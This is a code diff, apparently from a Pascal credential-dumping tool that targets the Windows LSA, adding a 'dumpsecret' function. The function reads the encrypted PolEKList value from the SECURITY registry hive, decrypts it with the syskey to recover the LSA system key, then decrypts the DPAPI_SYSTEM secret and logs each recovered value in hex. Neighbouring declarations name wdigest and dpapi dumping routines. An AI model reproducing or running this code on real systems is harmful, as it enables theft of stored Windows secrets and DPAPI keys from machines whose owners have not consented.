@@ -15,10 +15,11 @@ function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
 function wdigest(pid:dword):boolean;
 function dpapi(pid:dword):boolean;
 
-function lsasecrets(key:string;var output:tbytes):boolean;
+function lsasecret(key:string;var output:tbytes):boolean;
+function dumpsecret(const syskey:tbyte16;var output:tbytes):boolean;
 
 var
-  deskey,aeskey,iv,buffer:tbytes;
+  deskey,aeskey,iv:tbytes;
 
 implementation
 
@@ -194,7 +195,91 @@ type
        lstrcpyw (Value.buffer, PWideChar (wst))
      end;
 
-function lsasecrets(key:string;var output:tbytes):boolean;
+
+
+function dumpsecret(const syskey:tbyte16;var output:tbytes):boolean;
+var
+  ret:long;
+  topkey:thandle;
+  cbdata,lptype:dword;
+  data,clearsecret,secret,system_key,key:tbytes; //array[0..1023] of byte;
+begin
+  result:=false;
+  log('**** dumpsecret ****');
+  //we should check PolRevision first to decide nt5 vs nt6
+  //but also PolEKList" vs "PolSecretEncryptionKey
+  if MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\PolEKList'),pchar(''),data) then
+  begin
+    log('MyRegQueryValue OK',0);
+  //if 1=1 then
+  //   begin
+     cbdata:=length(data);
+     log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
+     log('hardsecret:'+ByteToHexaString (@data[0],cbdata));
+     //lets decode this encrypted secret stored in the registry
+     if lsadump_sec_aes256(data,cbdata,nil,@syskey[0]) then
+       begin
+       log('lsadump_sec_aes256 OK',0);
+       //get clearsecret
+       cbdata := cbdata - PtrUInt(@NT6_HARD_SECRET(Nil^).Secret);
+       setlength(clearsecret,cbdata);
+       copymemory(@clearsecret[0],@data[PtrUInt(@NT6_HARD_SECRET(Nil^).Secret)],cbdata);
+       log('clearsecret:'+ByteToHexaString (clearsecret));
+       log('SecretSize:'+inttostr(PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize)) ;
+       //retrieve secret field from clearsecret
+       setlength(secret,PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize);
+       copymemory(@secret[0],@clearsecret[sizeof(dword)*4],length(secret));
+       log('secret:'+ByteToHexaString (secret));
+       //_NT6_SYSTEM_KEYS
+       //only one key supported for now
+       log('nbKeys:'+inttostr(PNT6_SYSTEM_KEYS(@secret[0])^.nbKeys)) ;
+       setlength(system_key,1024);
+       copymemory(@system_key[0],@secret[sizeof(dword)*3+sizeof(guid)],length(secret));
+       log('KeyId:'+GUIDToString(PNT6_SYSTEM_KEY(@system_key[0])^.KeyId )) ;
+       setlength(key,PNT6_SYSTEM_KEY(@system_key[0])^.KeySize );
+       copymemory(@key[0],@system_key[sizeof(dword)*2+sizeof(guid)],length(key));
+       //log('Key:'+ByteToHexaString(@PNT6_SYSTEM_KEY(@system_key[0])^.Key[0],PNT6_SYSTEM_KEY(@system_key[0])^.KeySize ),1);
+       log('Key:'+ByteToHexaString(key));
+       end; //if lsadump_sec_aes256(data,cbdata,nil,@syskey[0]) then
+
+    //if we got a system key, lets decrypt a secret stored in the registry
+    if length(system_key)>0 then
+      begin
+      if MyRegQueryValue(HKEY_LOCAL_MACHINE ,pchar('Security\Policy\secrets\DPAPI_SYSTEM\CurrVal'),pchar(''),data) then
+        begin
+        log('MyRegQueryValue OK',0);
+         cbdata:=length(data);
+         log('RegQueryValue OK '+inttostr(cbdata)+' read',0);
+         log('hardsecret:'+ByteToHexaString (@data[0],cbdata));
+         //at least in nt6 case, we should match the hardsecret blob guid with the key guid...
+         //lets cheat for now and push the first supposedly system key
+         //rather we should push the system keyS aka @secrets[0] above
+         if lsadump_sec_aes256(data,cbdata,@system_key[0],nil) then
+                begin
+                log('lsadump_sec_aes256 OK',0);
+                //get clearsecret
+                cbdata := cbdata - PtrUInt(@NT6_HARD_SECRET(Nil^).Secret);
+                setlength(clearsecret,cbdata);
+                copymemory(@clearsecret[0],@data[PtrUInt(@NT6_HARD_SECRET(Nil^).Secret)],cbdata);
+                log('clearsecret:'+ByteToHexaString (clearsecret));
+                log('SecretSize:'+inttostr(PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize)) ;
+                //retrieve secret field from clearsecret
+                setlength(secret,PNT6_CLEAR_SECRET(@clearsecret[0])^.SecretSize);
+                copymemory(@secret[0],@clearsecret[sizeof(dword)*4],length(secret));
+                log('secret:'+ByteToHexaString (secret));
+                setlength(output,length(secret));
+                CopyMemory(@output[0],@secret[0],length(secret));
+                result:=true;
+                end; //if lsadump_sec_aes256(data,cbdata,@system_key[0],nil) then
+         end;//MyRegQueryValue
+      end;//if length(key)>0 then
+
+  end //MyRegQueryValue
+  else log('MyRegQueryValue failed:'+inttostr(getlasterror));
+log('**** dumpsecret:'+BoolToStr (result)+' ****');
+end;
+
+function lsasecret(key:string;var output:tbytes):boolean;
 const
   POLICY_ALL_ACCESS = $00F0FFF;
 var
